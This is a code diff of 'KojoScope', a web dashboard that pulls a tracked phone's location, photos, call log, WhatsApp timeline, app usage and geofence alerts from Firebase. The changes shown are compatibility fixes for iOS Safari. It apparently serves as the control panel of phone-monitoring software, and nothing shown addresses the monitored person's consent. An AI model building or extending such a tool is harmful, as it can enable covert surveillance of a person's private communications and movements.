@@ -57,83 +57,78 @@ td{padding:6px 4px;border-bottom:1px solid var(--border)}
 .alert-banner.warn{background:rgba(255,202,40,.15);color:var(--accent);border-bottom:1px solid rgba(255,202,40,.3)}
 .alert-banner.error{background:rgba(248,81,73,.15);color:var(--danger);border-bottom:1px solid rgba(248,81,73,.3)}
 @media(min-width:768px){
-  body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;height:100vh}
-  .header{grid-column:1/-1}
-  .sidebar{grid-column:1;overflow:hidden;display:flex;flex-direction:column;border-right:1px solid var(--border)}
-  .map-wrap{grid-column:2;grid-row:2}
-  #map{height:100%}
-  .content{max-height:none;flex:1}
-  .tabs+.content{flex:1;overflow-y:auto}
+body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;height:100vh}
+.header{grid-column:1/-1}
+.sidebar{grid-column:1;overflow:hidden;display:flex;flex-direction:column;border-right:1px solid var(--border)}
+.map-wrap{grid-column:2;grid-row:2}
+#map{height:100%}
+.content{max-height:none;flex:1}
+.tabs+.content{flex:1;overflow-y:auto}
 }
 </style>
 </head>
 <body>
-
 <div class="header">
-  <h1>&#x1F6F0; KojoScope</h1>
-  <select class="device-select" id="deviceSelect"><option value="">No devices</option></select>
-  <span class="status" id="statusDot">&#x25CF; Live</span>
-  <span class="read-budget" id="readBudget"></span>
+<h1>&#x1F6F0; KojoScope</h1>
+<select class="device-select" id="deviceSelect"><option value="">No devices</option></select>
+<span class="status" id="statusDot">&#x25CF; Live</span>
+<span class="read-budget" id="readBudget"></span>
 </div>
-
 <div class="alert-banner" id="alertBanner"></div>
-
 <div class="sidebar">
-  <div class="tabs" id="tabBar">
-    <button class="tab-btn active" data-tab="live">&#x1F4CD; Live</button>
-    <button class="tab-btn" data-tab="photos">&#x1F4F8; Photos</button>
-    <button class="tab-btn" data-tab="timeline">&#x1F4AC; Timeline</button>
-    <button class="tab-btn" data-tab="calls">&#x1F4DE; Calls</button>
-    <button class="tab-btn" data-tab="apps">&#x1F4CA; Apps</button>
-    <button class="tab-btn" data-tab="geofence">&#x2699; Geo</button>
-  </div>
-  <div class="content" id="tabContent">
-    <div class="active" id="tab-live">
-      <div class="grid">
-        <div><div class="label">Latitude</div><div class="value" id="latVal">--</div></div>
-        <div><div class="label">Longitude</div><div class="value" id="lngVal">--</div></div>
-        <div><div class="label">Accuracy</div><div class="value" id="accVal">--</div></div>
-        <div><div class="label">Speed</div><div class="value" id="spdVal">--</div></div>
-        <div><div class="label">Device</div><div class="value" id="devVal">--</div></div>
-        <div><div class="label">Battery</div><div class="value" id="batVal">--</div></div>
-        <div><div class="label">WiFi</div><div class="value" id="wifiVal">--</div></div>
-        <div><div class="label">Last Seen</div><div class="value" id="seenVal">--</div></div>
-        <div><div class="label">Updated</div><div class="value" id="updatedVal" style="font-size:11px">--</div></div>
-      </div>
-      <div class="coord-box" id="coordBox" style="cursor:pointer" title="Click to copy">--</div>
-      <div class="label">Address</div>
-      <div class="value" id="addrVal" style="font-size:13px;color:var(--muted)">--</div>
-    </div>
-    <div id="tab-photos"><div class="photo-grid" id="photoGrid"><div class="label">No photos yet</div></div></div>
-    <div id="tab-timeline">
-      <div class="filter-chips" id="timelineChips">
-        <span class="chip active" data-filter="all">All</span>
-        <span class="chip" data-filter="location">&#x1F4CD; Location</span>
-        <span class="chip" data-filter="call">&#x1F4DE; Call</span>
-        <span class="chip" data-filter="whatsapp">&#x1F4AC; WhatsApp</span>
-      </div>
-      <div id="timelineList"></div>
-    </div>
-    <div id="tab-calls"><table><thead><tr><th>Time</th><th>Number</th><th>Duration</th><th>Type</th></tr></thead><tbody id="callsBody"></tbody></table></div>
-    <div id="tab-apps"><div id="appsChart"></div></div>
-    <div id="tab-geofence"><div id="geofenceList"></div></div>
-  </div>
+<div class="tabs" id="tabBar">
+<button class="tab-btn active" data-tab="live">&#x1F4CD; Live</button>
+<button class="tab-btn" data-tab="photos">&#x1F4F8; Photos</button>
+<button class="tab-btn" data-tab="timeline">&#x1F4AC; Timeline</button>
+<button class="tab-btn" data-tab="calls">&#x1F4DE; Calls</button>
+<button class="tab-btn" data-tab="apps">&#x1F4CA; Apps</button>
+<button class="tab-btn" data-tab="geofence">&#x2699; Geo</button>
 </div>
-
+<div class="content" id="tabContent">
+<div class="active" id="tab-live">
+<div class="grid">
+<div><div class="label">Latitude</div><div class="value" id="latVal">--</div></div>
+<div><div class="label">Longitude</div><div class="value" id="lngVal">--</div></div>
+<div><div class="label">Accuracy</div><div class="value" id="accVal">--</div></div>
+<div><div class="label">Speed</div><div class="value" id="spdVal">--</div></div>
+<div><div class="label">Device</div><div class="value" id="devVal">--</div></div>
+<div><div class="label">Battery</div><div class="value" id="batVal">--</div></div>
+<div><div class="label">WiFi</div><div class="value" id="wifiVal">--</div></div>
+<div><div class="label">Last Seen</div><div class="value" id="seenVal">--</div></div>
+<div><div class="label">Updated</div><div class="value" id="updatedVal" style="font-size:11px">--</div></div>
+</div>
+<div class="coord-box" id="coordBox" style="cursor:pointer" title="Click to copy">--</div>
+<div class="label">Address</div>
+<div class="value" id="addrVal" style="font-size:13px;color:var(--muted)">--</div>
+</div>
+<div id="tab-photos"><div class="photo-grid" id="photoGrid"><div class="label">No photos yet</div></div></div>
+<div id="tab-timeline">
+<div class="filter-chips" id="timelineChips">
+<span class="chip active" data-filter="all">All</span>
+<span class="chip" data-filter="location">&#x1F4CD; Location</span>
+<span class="chip" data-filter="call">&#x1F4DE; Call</span>
+<span class="chip" data-filter="whatsapp">&#x1F4AC; WhatsApp</span>
+</div>
+<div id="timelineList"></div>
+</div>
+<div id="tab-calls"><table><thead><tr><th>Time</th><th>Number</th><th>Duration</th><th>Type</th></tr></thead><tbody id="callsBody"></tbody></table></div>
+<div id="tab-apps"><div id="appsChart"></div></div>
+<div id="tab-geofence"><div id="geofenceList"></div></div>
+</div>
+</div>
 <div class="map-wrap">
-  <div id="map"></div>
-  <div class="playback-bar" id="playbackBar" style="display:none">
-    <button id="playBtn">&#x25B6;</button>
-    <button id="rewindBtn">&#x23EE;</button>
-    <select id="speedSelect" style="background:var(--bg);color:var(--text);border:1px solid var(--border);font-size:11px;padding:2px 4px">
-      <option value="1">1x</option><option value="5">5x</option><option value="10" selected>10x</option><option value="50">50x</option>
-    </select>
-    <input type="range" id="playScrubber" min="0" max="100" value="0">
-    <span class="ts" id="playTs">--</span>
-    <span class="ts" id="playCount">0/0</span>
-  </div>
+<div id="map"></div>
+<div class="playback-bar" id="playbackBar" style="display:none">
+<button id="playBtn">&#x25B6;</button>
+<button id="rewindBtn">&#x23EE;</button>
+<select id="speedSelect" style="background:var(--bg);color:var(--text);border:1px solid var(--border);font-size:11px;padding:2px 4px">
+<option value="1">1x</option><option value="5">5x</option><option value="10" selected>10x</option><option value="50">50x</option>
+</select>
+<input type="range" id="playScrubber" min="0" max="100" value="0">
+<span class="ts" id="playTs">--</span>
+<span class="ts" id="playCount">0/0</span>
 </div>
-
+</div>
 <div class="lightbox" id="lightbox"><img id="lightboxImg" alt=""></div>
 
 <script>
@@ -177,7 +172,6 @@ function trackRead(count = 1) {
   if (readBudget.day !== today) { readBudget = { count: 0, day: today }; }
   readBudget.count += count;
   localStorage.setItem('readBudget', JSON.stringify(readBudget));
-  const pct = Math.round(readBudget.count / 50000 * 100);
   document.getElementById('readBudget').textContent = `\u{1F4CA} ${readBudget.count.toLocaleString()}/50K`;
   if (readBudget.count > 40000) {
     intervals.loc = 10000; intervals.hist = 60000; intervals.meta = 60000;
@@ -204,6 +198,7 @@ function geocode(lat, lng) {
     if (!nomProcessing) processNomQueue();
   });
 }
+
 async function processNomQueue() {
   nomProcessing = true;
   while (nomQueue.length) {
@@ -245,6 +240,7 @@ function simplify(points, tolerance = 300) {
   }
   return [first, last];
 }
+
 function perpendicularDist(p, a, b) {
   const dx = b[0] - a[0], dy = b[1] - a[1];
   const num = Math.abs(dy * p[0] - dx * p[1] + b[0] * a[1] - b[1] * a[0]);
@@ -268,6 +264,7 @@ function saveGeofences() {
   localStorage.setItem('geofences', JSON.stringify(geofences));
   renderGeofenceList();
 }
+
 function addGeofence(lat, lng) {
   const name = prompt('Geofence name:');
   if (!name) return;
@@ -275,6 +272,7 @@ function addGeofence(lat, lng) {
   saveGeofences();
   renderGeofences();
 }
+
 function renderGeofences() {
   map.eachLayer(l => { if (l._isGeofence) map.removeLayer(l); });
   geofences.filter(g => g.active).forEach(g => {
@@ -282,16 +280,26 @@ function renderGeofences() {
       ._isGeofence = true;
   });
 }
+
+// FIX: Guard Notification API — not available in all iOS Safari contexts
+function sendNotification(title, body) {
+  if (typeof Notification === 'undefined') return;
+  if (Notification.permission === 'granted') {
+    try { new Notification(title, { body }); } catch {}
+  }
+}
+
 function checkGeofences(lat, lng) {
   geofences.filter(g => g.active).forEach(g => {
     const dist = haversine(lat, lng, g.lat, g.lng);
     const inside = dist <= g.radius;
     if (inside && !alertedZones.has(g.id)) {
-      if (Notification.permission === 'granted') new Notification('Geofence: ' + g.name, { body: 'Device entered ' + g.name });
+      sendNotification('Geofence: ' + g.name, 'Device entered ' + g.name);
       alertedZones.add(g.id);
     } else if (!inside) alertedZones.delete(g.id);
   });
 }
+
 function renderGeofenceList() {
   const el = document.getElementById('geofenceList');
   if (!geofences.length) { el.innerHTML = '<div class="label">Right-click map to add geofence</div>'; return; }
@@ -308,6 +316,7 @@ function renderGeofenceList() {
       </div>
     </div>`).join('');
 }
+
 document.addEventListener('click', e => {
   const btn = e.target.closest('[data-action]');
   if (!btn) return;
@@ -317,6 +326,7 @@ document.addEventListener('click', e => {
   if (btn.dataset.action === 'toggle') { gf.active = !gf.active; saveGeofences(); renderGeofences(); }
   if (btn.dataset.action === 'delete') { geofences = geofences.filter(g => g.id !== id); saveGeofences(); renderGeofences(); }
 });
+
 document.addEventListener('input', e => {
   if (e.target.classList.contains('gf-radius')) {
     const id = e.target.dataset.gf;
@@ -324,6 +334,7 @@ document.addEventListener('input', e => {
     if (gf) { gf.radius = parseInt(e.target.value); saveGeofences(); renderGeofences(); }
   }
 });
+
 map.on('contextmenu', e => addGeofence(e.latlng.lat, e.latlng.lng));
 
 // --- Photo Lightbox ---
@@ -367,6 +378,7 @@ document.getElementById('deviceSelect').addEventListener('change', function() {
 function stopPolling() {
   pollTimers.forEach(t => clearTimeout(t)); pollTimers = [];
 }
+
 function startPolling() {
   stopPolling();
   schedulePoll('loc', intervals.loc, pollLocation);
@@ -375,6 +387,7 @@ function startPolling() {
   schedulePoll('apps', intervals.apps, pollApps);
   schedulePoll('hist', intervals.hist, pollHistory);
 }
+
 function schedulePoll(name, interval, fn) {
   async function run() {
     try { await fn(); } catch {}
@@ -388,7 +401,8 @@ async function pollAll() {
 }
 
 // --- Firebase helpers ---
-// Firestore REST API (has CORS) — preferred
+
+// Firestore REST API
 async function fetchFirestore(path) {
   trackRead();
   try {
@@ -397,6 +411,7 @@ async function fetchFirestore(path) {
     return r.json();
   } catch { return null; }
 }
+
 async function listFirestoreDocs(path) {
   trackRead();
   try {
@@ -406,6 +421,7 @@ async function listFirestoreDocs(path) {
     return data.documents || [];
   } catch { return []; }
 }
+
 async function runFirestoreQuery(parentDoc, collectionId, field, op, value, limit = 50) {
   trackRead();
   try {
@@ -425,7 +441,7 @@ async function runFirestoreQuery(parentDoc, collectionId, field, op, value, limi
     return results.filter(r => r.document).map(r => r.document);
   } catch { return []; }
 }
-// Collection group query across ALL parent docs (e.g., all `info` docs under devices/*/)
+
 async function fetchFirestoreCollectionGroup(collectionId, limit = 50) {
   trackRead();
   try {
@@ -443,28 +459,27 @@ async function fetchFirestoreCollectionGroup(collectionId, limit = 50) {
     return results.filter(r => r.document).map(r => r.document);
   } catch { return []; }
 }
-// RTDB uses JSONP (no CORS on RTDB) — fallback only
-function fetchRTDB(path, query) {
+
+// FIX: Replace JSONP with plain fetch() — Firebase RTDB REST API supports CORS natively.
+// The old JSONP approach (dynamic <script> injection) is blocked by iOS Safari's
+// stricter Content Security Policy, which is why data never loaded on iPhone.
+async function fetchRTDB(path, query) {
   trackRead();
-  return new Promise((resolve) => {
-    const cb = '_rtdb' + Date.now();
-    window[cb] = function(data) { cleanup(); resolve(data); };
-    const s = document.createElement('script');
-    const qs = query ? '?' + query + '&' : '?';
-    s.src = `${RTDB}/${path}.json${qs}callback=${cb}`;
-    const timeout = setTimeout(() => { cleanup(); resolve(null); }, 10000);
-    function cleanup() { clearTimeout(timeout); delete window[cb]; if (s.parentNode) s.parentNode.removeChild(s); }
-    s.onerror = cleanup;
-    document.head.appendChild(s);
-  });
+  try {
+    const qs = query ? `?${query}` : '';
+    const r = await fetch(`${RTDB}/${path}.json${qs}`);
+    if (!r.ok) return null;
+    return r.json();
+  } catch { return null; }
 }
-// Try Firestore first, fall back to RTDB JSONP for backward compat
+
 async function fetchMetrics(id) {
   const doc = await fetchFirestore(`devices/${id}/metrics/latest`);
   if (doc && doc.fields) return firestoreFieldsToObj(doc.fields);
   const m = await fetchRTDB(`devices/${id}/metrics/latest`);
   return m;
 }
+
 function firestoreFieldsToObj(fields) {
   const o = {};
   for (const k in fields) {
@@ -479,7 +494,6 @@ function firestoreFieldsToObj(fields) {
 }
 
 async function fetchDevices() {
-  // Try Firestore collection group query on `info` docs
   const infoDocs = await fetchFirestoreCollectionGroup('info', 20);
   if (infoDocs && infoDocs.length) {
     devices = {};
@@ -504,7 +518,7 @@ async function fetchDevices() {
     return;
   }
 
-  // Fallback: RTDB JSONP shallow query
+  // Fallback: RTDB fetch (now using fetch() instead of JSONP)
   const data = await fetchRTDB('devices', 'shallow=true');
   if (!data) {
     document.getElementById('statusDot').textContent = '\u2716 No data';
@@ -532,6 +546,7 @@ async function pollLocation() {
   updateMap(loc);
   checkGeofences(loc.lat, loc.lng);
 }
+
 async function pollMeta() {
   if (!selectedDevice) return;
   const m = await fetchMetrics(selectedDevice);
@@ -539,11 +554,11 @@ async function pollMeta() {
   document.getElementById('batVal').textContent = (m.batteryPct || '--') + '%' + (m.isCharging ? ' \u26A1' : '');
   document.getElementById('wifiVal').textContent = m.wifiSsid || '--';
   document.getElementById('devVal').textContent = m.deviceModel || '--';
-  // Update device label in dropdown with model name if known
   if (m.deviceModel && devices[selectedDevice]) {
     const label = [m.manufacturer, m.deviceModel].filter(Boolean).join(' ');
     devices[selectedDevice].label = label;
-    document.querySelector(`#deviceSelect option[value="${selectedDevice}"]`).textContent = label;
+    const opt = document.querySelector(`#deviceSelect option[value="${selectedDevice}"]`);
+    if (opt) opt.textContent = label;
   }
   const ts = parseInt(m.ts_ms || '0');
   if (ts > lastUpdateTime) {
@@ -553,6 +568,7 @@ async function pollMeta() {
     document.getElementById('statusDot').className = 'status';
   }
 }
+
 let lastPhotoTs = 0;
 async function pollPhotos() {
   if (!selectedDevice) return;
@@ -583,6 +599,7 @@ async function pollPhotos() {
   }
   if (!Object.keys(cachedPhotos).length) grid.innerHTML = '<div class="label">No photos yet</div>';
 }
+
 async function pollApps() {
   if (!selectedDevice) return;
   const docs = await listFirestoreDocs(`devices/${selectedDevice}/apps`);
@@ -603,6 +620,7 @@ async function pollApps() {
       <span class="bar-val">${(a.ms/60000).toFixed(1)}m</span>
     </div>`).join('');
 }
+
 async function pollHistory() {
   if (!selectedDevice) return;
   const docs = await listFirestoreDocs(`devices/${selectedDevice}/timeline`);
@@ -618,25 +636,29 @@ function updateLocationUI(loc) {
   document.getElementById('spdVal').textContent = (loc.speed || 0).toFixed(1) + ' m/s';
   document.getElementById('seenVal').textContent = pkt(loc.ts_ms || Date.now());
   document.getElementById('coordBox').textContent = `${loc.lat.toFixed(6)}, ${loc.lng.toFixed(6)}`;
-  document.getElementById('coordBox').onclick = () => navigator.clipboard.writeText(`${loc.lat},${loc.lng}`).then(() => showAlert('Copied!'));
-
+  document.getElementById('coordBox').onclick = () => {
+    const txt = `${loc.lat},${loc.lng}`;
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(txt).then(() => showAlert('Copied!')).catch(() => showAlert('Copy failed', 'error'));
+    }
+  };
   geocode(loc.lat, loc.lng).then(d => {
     if (d) document.getElementById('addrVal').textContent = d.display_name || '--';
   });
 }
+
 function updateMap(loc) {
   const latlng = [loc.lat, loc.lng];
   if (marker) { marker.setLatLng(latlng); }
   else { marker = L.marker(latlng).addTo(map).bindPopup('Current'); }
   if (accuracyCircle) map.removeLayer(accuracyCircle);
   accuracyCircle = L.circle(latlng, { radius: loc.accuracy || 50, color: '#3fb950', fillOpacity: 0.1 }).addTo(map);
-
   locationHistory.push([loc.lat, loc.lng]);
   if (locationHistory.length > 500) locationHistory.shift();
   updateTrail();
-
   if (locationHistory.length === 1) map.setView(latlng, 15);
 }
+
 function updateTrail() {
   if (trail) map.removeLayer(trail);
   if (locationHistory.length < 2) return;
@@ -649,11 +671,13 @@ function updateTrail() {
 
 // --- Playback ---
 let playbackPoints = [];
+
 function setupPlayback(pts) {
   playbackPoints = pts;
   const scrubber = document.getElementById('playScrubber');
   scrubber.max = Math.max(0, pts.length - 1);
 }
+
 document.getElementById('playBtn').addEventListener('click', function() {
   if (playbackRunning) { playbackRunning = false; this.textContent = '\u25B6';
     if (playbackTimer) clearInterval(playbackTimer); return; }
@@ -672,6 +696,7 @@ document.getElementById('playBtn').addEventListener('click', function() {
     playbackIdx++;
   }, 1000 / speed);
 });
+
 document.getElementById('rewindBtn').addEventListener('click', () => {
   playbackRunning = false; playbackIdx = 0;
   if (playbackTimer) clearInterval(playbackTimer);
@@ -680,6 +705,7 @@ document.getElementById('rewindBtn').addEventListener('click', () => {
   document.getElementById('playCount').textContent = `0/${playbackPoints.length}`;
   if (playbackPoints.length && marker) marker.setLatLng(playbackPoints[0]);
 });
+
 document.getElementById('playScrubber').addEventListener('input', function() {
   playbackIdx = parseInt(this.value);
   if (playbackPoints[playbackIdx] && marker) marker.setLatLng(playbackPoints[playbackIdx]);
@@ -693,9 +719,9 @@ document.querySelectorAll('.chip[data-filter]').forEach(chip => {
     document.querySelectorAll('.chip[data-filter]').forEach(c => c.classList.remove('active'));
     chip.classList.add('active');
     timelineFilter = chip.dataset.filter;
-    const docs = []; // re-render from cached if needed
   });
 });
+
 function renderTimeline(docs) {
   const list = document.getElementById('timelineList');
   const filtered = docs.filter(d => {
@@ -721,6 +747,7 @@ function renderTimeline(docs) {
     </div>`;
   }).join('') || '<div class="label">No entries</div>';
 }
+
 function renderCalls(docs) {
   const body = document.getElementById('callsBody');
   const calls = docs.filter(d => (d.fields?.type?.stringValue || '').includes('call')).slice(0, 50);
@@ -738,13 +765,17 @@ function renderCalls(docs) {
 document.addEventListener('keydown', e => {
   if (e.key === 'c' && e.ctrlKey) {
     const text = document.getElementById('coordBox').textContent;
-    if (text !== '--') navigator.clipboard.writeText(text);
+    if (text !== '--' && navigator.clipboard) navigator.clipboard.writeText(text).catch(() => {});
   }
 });
 
 // --- Init ---
 async function init() {
-  if (Notification.permission === 'default') Notification.requestPermission();
+  // FIX: Guard Notification API — iOS Safari requires a user gesture and
+  // may not support Notification at all in regular (non-PWA) browsing mode.
+  if (typeof Notification !== 'undefined' && Notification.permission === 'default') {
+    try { await Notification.requestPermission(); } catch {}
+  }
   try { await fetchDevices(); } catch {}
   if (selectedDevice) try { await pollAll(); } catch {}
   startPolling();
@@ -754,6 +785,7 @@ async function init() {
     showAlert('Right-click on map to add geofences', 'warn');
   }
 }
+
 init();
 </script>
 </body>
